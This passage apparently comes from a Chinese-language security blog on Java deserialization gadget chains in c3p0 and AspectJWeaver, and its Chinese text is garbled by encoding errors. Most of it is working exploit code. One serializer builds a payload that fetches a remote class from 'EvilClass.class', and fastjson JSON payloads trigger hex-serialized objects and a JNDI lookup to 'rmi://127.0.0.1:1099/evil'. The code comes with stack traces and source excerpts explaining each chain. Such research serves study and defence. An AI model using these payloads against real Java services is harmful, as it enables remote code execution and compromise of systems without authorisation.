<span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line">        <span class="keyword">private</span> String className;</span><br><span class="line">        <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">PoolSource</span><span class="params">(String className, String url)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.className = className;</span><br><span class="line">            <span class="built_in">this</span>.url = url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;foo&quot;</span>, <span class="built_in">this</span>.className, <span class="built_in">this</span>.url);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException &#123;&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span> <span class="params">( <span class="type">int</span> seconds )</span> <span class="keyword">throws</span> SQLException &#123;&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] r = splitClassUrl(url);</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">base</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        setFieldValue(base, <span class="string">&quot;connectionPoolDataSource&quot;</span>, <span class="keyword">new</span> <span class="title class_">PoolSource</span>(r[<span class="number">1</span>], r[<span class="number">0</span>]));</span><br><span class="line">        <span class="keyword">return</span> base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String url) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(url));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;http://127.0.0.1:9999/EvilClass.class&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String[] splitClassUrl(String s) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(s);</span><br><span class="line">        <span class="comment">// æœåŠ¡å™¨åŸºå€ï¼ˆå«åè®®/ä¸»æœº/ç«¯å£ï¼Œå…¼å®¹ IPv6ï¼‰</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> u.getProtocol() + <span class="string">&quot;://&quot;</span> + u.getAuthority() + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="comment">// ç±»åï¼ˆå»æ‰æœ€åè·¯å¾„æ®µçš„ .class åç¼€ï¼‰</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> u.getPath();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> path.lastIndexOf(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> (i &gt;= <span class="number">0</span>) ? path.substring(i + <span class="number">1</span>) : path;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> file.endsWith(<span class="string">&quot;.class&quot;</span>) ? file.substring(<span class="number">0</span>, file.length() - <span class="string">&quot;.class&quot;</span>.length()) : file;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;base, cls&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="äºŒæ¬¡ååºåˆ—åŒ–ï¼ˆsetter-è§¦å‘ï¼‰"><a href="#äºŒæ¬¡ååºåˆ—åŒ–ï¼ˆsetter-è§¦å‘ï¼‰" class="headerlink" title="äºŒæ¬¡ååºåˆ—åŒ–ï¼ˆsetter è§¦å‘ï¼‰"></a>äºŒæ¬¡ååºåˆ—åŒ–ï¼ˆsetter è§¦å‘ï¼‰</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:431)</span><br><span class="line">at com.mchange.v2.ser.SerializableUtils.deserializeFromByteArray(SerializableUtils.java:144)</span><br><span class="line">at com.mchange.v2.ser.SerializableUtils.fromByteArray(SerializableUtils.java:123)</span><br><span class="line">at com.mchange.v2.c3p0.impl.C3P0ImplUtils.parseUserOverridesAsString(C3P0ImplUtils.java:252)</span><br><span class="line">at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource$1.vetoableChange(WrapperConnectionPoolDataSource.java:58)</span><br><span class="line">at java.beans.VetoableChangeSupport.fireVetoableChange(VetoableChangeSupport.java:375)</span><br><span class="line">at java.beans.VetoableChangeSupport.fireVetoableChange(VetoableChangeSupport.java:271)</span><br><span class="line">at com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase.setUserOverridesAsString(WrapperConnectionPoolDataSourceBase.java:441)</span><br></pre></td></tr></table></figure></div>

<h3 id="åŸç†åˆ†æ-2"><a href="#åŸç†åˆ†æ-2" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h3><p><code>com.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsString</code> å‡½æ•°ä¼šå°†å­ä¸² <code>userOverridesAsString[len(&quot;HexAsciiSerializedMap&quot;) + 1 : -1]</code> ä» HEX è½¬æ¢ä¸º bytesï¼Œç„¶åè°ƒç”¨ <code>com.mchange.v2.ser.SerializableUtils#fromByteArray</code> è¿›è¡Œåç»­ååºåˆ—åŒ–æ“ä½œã€‚</p>
<p>è¿™é‡Œ <code>userOverridesAsString</code> å°±æ˜¯è°ƒç”¨ <code>com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</code> æ—¶ä¼ å…¥çš„å‚æ•°ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HASM_HEADER</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123; </span><br><span class="line">    <span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æœ€åä¼šåœ¨ <code>SerializableUtils#deserializeFromByteArray</code> å‡½æ•°è¿›è¡Œå®é™…çš„ååºåˆ—åŒ–æ“ä½œï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">Object</span> <span class="variable">out</span> <span class="operator">=</span> deserializeFromByteArray( bytes ); </span><br><span class="line">    <span class="keyword">if</span> (out <span class="keyword">instanceof</span> IndirectlySerialized)</span><br><span class="line">        <span class="keyword">return</span> ((IndirectlySerialized) out).getObject();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line">    <span class="keyword">return</span> in.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="åˆ©ç”¨ä»£ç -3"><a href="#åˆ©ç”¨ä»£ç -3" class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> ByteUtils.toHexAscii(URLDNS.getPayload(<span class="string">&quot;http://www.example.com&quot;</span>));</span><br><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è§¦å‘</span></span><br><span class="line"><span class="type">WrapperConnectionPoolDataSource</span> <span class="variable">wrapperConnectionPoolDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WrapperConnectionPoolDataSource</span>();</span><br><span class="line">wrapperConnectionPoolDataSource.setUserOverridesAsString(payload); </span><br></pre></td></tr></table></figure></div>

<p>ç”±äºæ˜¯ setter è§¦å‘ï¼Œå¯ä»¥é…åˆ fastjson ä½¿ç”¨ï¼š</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> </span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span> </span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> </span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;userOverridesAsString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HexAsciiSerializedMap:&lt;hexEXP&gt;!&quot;</span> </span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>bytes è½¬ hex çš„å·¥å…·å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> String <span class="title function_">toHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] HEX = <span class="string">&quot;0123456789ABCDEF&quot;</span>.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] out = <span class="keyword">new</span> <span class="title class_">char</span>[bytes.length * <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> bytes[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        out[j++] = HEX[v &gt;&gt;&gt; <span class="number">4</span>];</span><br><span class="line">        out[j++] = HEX[v &amp; <span class="number">0x0F</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(out);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="JNDIï¼ˆsetter-è§¦å‘ï¼‰"><a href="#JNDIï¼ˆsetter-è§¦å‘ï¼‰" class="headerlink" title="JNDIï¼ˆsetter è§¦å‘ï¼‰"></a>JNDIï¼ˆsetter è§¦å‘ï¼‰</h2><p><code>com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource</code> ç±»å¯ä»¥é€šè¿‡ setter è§¦å‘ JNDIã€‚</p>
<h3 id="åŸç†åˆ†æ-3"><a href="#åŸç†åˆ†æ-3" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h3><p>é¦–å…ˆ <code>JndiRefConnectionPoolDataSource#setJndiName</code> ä¼šè°ƒç”¨ <code>com.mchange.v2.c3p0.impl.JndiRefDataSourceBase#setJndiName</code> è®¾ç½® <code>jndiName</code> å±æ€§ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">at com.mchange.v2.c3p0.impl.JndiRefDataSourceBase.setJndiName(JndiRefDataSourceBase.java:110)</span><br><span class="line">at com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource.setJndiName(JndiRefConnectionPoolDataSource.java:70)</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹å <code>JndiRefConnectionPoolDataSource#setLoginTimeout</code> ä¼šè§¦å‘ JNDIï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">at com.mchange.v2.c3p0.JndiRefForwardingDataSource.dereference(JndiRefForwardingDataSource.java:77)</span><br><span class="line">at com.mchange.v2.c3p0.JndiRefForwardingDataSource.inner(JndiRefForwardingDataSource.java:99)</span><br><span class="line">at com.mchange.v2.c3p0.JndiRefForwardingDataSource.setLoginTimeout(JndiRefForwardingDataSource.java:122)</span><br><span class="line">at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.setLoginTimeout(WrapperConnectionPoolDataSource.java:264)</span><br><span class="line">at com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource.setLoginTimeout(JndiRefConnectionPoolDataSource.java:375)</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference</code> ä¼šæŒ‰ç…§å‰é¢è®¾ç½®çš„ <code>jndiName</code> è¿›è¡Œ JNDI æŸ¥æ‰¾ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> DataSource <span class="title function_">dereference</span><span class="params">()</span> <span class="keyword">throws</span> SQLException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">jndiName</span> <span class="operator">=</span> <span class="built_in">this</span>.getJndiName();</span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">jndiEnv</span> <span class="operator">=</span> <span class="built_in">this</span>.getJndiEnv();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InitialContext ctx;</span><br><span class="line">        <span class="keyword">if</span> (jndiEnv != <span class="literal">null</span>)</span><br><span class="line">            ctx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>( jndiEnv );</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ctx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="keyword">if</span> (jndiName <span class="keyword">instanceof</span> String)</span><br><span class="line">            <span class="keyword">return</span> (DataSource) ctx.lookup( (String) jndiName ); <span class="comment">// ğŸ‘ˆ</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="åˆ©ç”¨ä»£ç -4"><a href="#åˆ©ç”¨ä»£ç -4" class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h3><p>è§¦å‘ä»£ç ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JndiRefConnectionPoolDataSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JndiRefConnectionPoolDataSource</span>();</span><br><span class="line">source.setJndiName(<span class="string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>);</span><br><span class="line">source.setLoginTimeout(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>

<p>é…åˆ fastjson ä½¿ç”¨ï¼š</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1099/evil&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;loginTimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span> </span><br><span class="line">        <span class="punctuation">&#125;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="AspectJWeaver"><a href="#AspectJWeaver" class="headerlink" title="AspectJWeaver"></a>AspectJWeaver</h1><p>AspectJ æ˜¯ Java ç¤¾åŒºæœ€çŸ¥åçš„<strong>é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰æ¡†æ¶</strong>ã€‚å®ƒæ‰©å±•äº† Javaï¼Œæ”¯æŒåœ¨å·²æœ‰ä»£ç çš„<strong>æŒ‡å®šä½ç½®</strong>ï¼ˆæ–¹æ³•è°ƒç”¨å‰åã€å¼‚å¸¸æŠ›å‡ºã€å­—æ®µè®¿é—®ç­‰ï¼‰æ³¨å…¥é¢å¤–çš„é€»è¾‘ï¼Œä¸”<strong>ä¸éœ€è¦ä¿®æ”¹åŸå§‹ä»£ç </strong>ã€‚</p>
<p>AspectJWeaver çš„æœ¬è´¨æ˜¯ä¸€ç§<strong>å­—èŠ‚ç ä¿®æ”¹å·¥å…·</strong>ï¼š</p>
<ul>
<li>è¯»å– <code>.class</code> æ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶ Java ç±»æ–‡ä»¶ï¼‰ã€‚</li>
<li>æ ¹æ®ç”¨æˆ·å®šä¹‰çš„åˆ‡é¢è§„åˆ™ï¼ˆpointcut å’Œ adviceï¼‰ï¼ŒåŠ¨æ€æˆ–é™æ€åœ°æ’å…¥é¢å¤–çš„å­—èŠ‚ç ï¼ˆ<strong>ç¼–ç»‡ weaving</strong>ï¼‰ã€‚</li>
<li>è¾“å‡ºä¿®æ”¹åçš„ç±»æ–‡ä»¶ä¾› JVM æ‰§è¡Œã€‚</li>
</ul>
<p>å› æ­¤ï¼Œâ€œWeaverâ€ å°±æ˜¯â€œç¼–ç»‡å™¨â€ï¼Œå°†åˆ‡é¢ä»£ç ä¸ä¸šåŠ¡ä»£ç èåˆã€‚</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="ä»»æ„æ–‡ä»¶å†™ï¼ˆååºåˆ—åŒ–è§¦å‘ï¼‰"><a href="#ä»»æ„æ–‡ä»¶å†™ï¼ˆååºåˆ—åŒ–è§¦å‘ï¼‰" class="headerlink" title="ä»»æ„æ–‡ä»¶å†™ï¼ˆååºåˆ—åŒ–è§¦å‘ï¼‰"></a>ä»»æ„æ–‡ä»¶å†™ï¼ˆååºåˆ—åŒ–è§¦å‘ï¼‰</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">at java.io.FileOutputStream.write(FileOutputStream.java:313)</span><br><span class="line">at org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap.writeToPath(SimpleCache.java:255)</span><br><span class="line">at org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap.put(SimpleCache.java:193)</span><br><span class="line">at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:159)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:74)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode(TiedMapEntry.java:121)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:338)</span><br><span class="line">at java.util.HashMap.put(HashMap.java:611)</span><br><span class="line">at java.util.HashSet.readObject(HashSet.java:334)</span><br></pre></td></tr></table></figure></div>

<h3 id="åŸç†åˆ†æ-4"><a href="#åŸç†åˆ†æ-4" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h3><p>å‰åŠéƒ¨åˆ†æ˜¯åŸºäº CC10ï¼ˆCC6+<code>HashSet</code>ï¼‰å®ç°çš„ï¼Œè¿™æ¡é“¾é€šè¿‡ <code>org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode</code> æ–¹æ³•è§¦å‘äº† <code>LazyMap</code> çš„ <code>get</code> æ–¹æ³•è°ƒç”¨ã€‚è€Œ <code>LazyMap</code> åœ¨è°ƒç”¨ <code>LazyMap#factory</code> çš„ <code>transform</code> æ–¹æ³•åä¼šå°† <code>transform</code> çš„è¿”å›ç»“æœ <code>value</code> ä¸åŸæœ¬çš„ <code>key</code> ä¸€èµ·æ”¾åˆ° <code>map</code> ä¸­ã€‚</p>
